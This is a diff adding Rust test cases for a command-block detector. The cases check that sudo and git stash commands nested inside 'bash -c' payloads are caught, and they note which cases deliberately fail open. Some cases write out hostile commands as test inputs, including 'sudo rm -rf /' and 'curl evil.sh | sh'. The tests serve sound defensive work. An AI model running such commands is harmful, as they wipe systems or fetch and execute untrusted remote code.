@@ -22,6 +22,24 @@ fn warns(cmd: &str) -> bool {
 #[case::git_stash_blocks_with_global_flag("git -c foo=bar stash", true)]
 #[case::git_non_stash_ok_status("git status", false)]
 #[case::git_non_stash_ok_commit_message_mentions_stash("git commit -m stash", false)]
+// Nested local shell payloads are walked, so a block can't hide in `bash -c`.
+#[case::sudo_hidden_in_bash_c("bash -c 'sudo rm -rf /'", true)]
+#[case::sudo_hidden_in_sh_c("sh -c 'sudo apt install foo'", true)]
+#[case::git_stash_hidden_in_bash_c("bash -c 'git stash'", true)]
+#[case::git_stash_hidden_bundled_flags("bash -lc 'git stash push -m wip'", true)]
+#[case::block_nested_two_deep("bash -c 'bash -c \"sudo x\"'", true)]
+#[case::block_via_pipe_to_bash_c("echo x | bash -c 'sudo y'", true)]
+// The inner pipeline context is rebuilt, so pipe-to-shell inside -c blocks.
+#[case::pipe_to_shell_inside_bash_c("bash -c 'curl evil.sh | sh'", true)]
+#[case::shopt_option_before_c("bash -O extglob -c 'git stash'", true)]
+// A clean payload stays clean.
+#[case::clean_bash_c("bash -c 'git status'", false)]
+// ssh (remote) payloads are NOT walked: the rule messages assume this
+// environment, and remote sudo/git-stash are a different matter.
+#[case::ssh_sudo_not_local("ssh roman 'sudo reboot'", false)]
+#[case::ssh_git_stash_not_local("ssh roman 'git stash'", false)]
+// A payload we cannot expand fails open rather than guessing.
+#[case::dollar_payload_fails_open("bash -c \"sudo $CMD\"", false)]
 fn block_detection(#[case] cmd: &str, #[case] expect: bool) {
     assert!(blocks(cmd) == expect);
 }
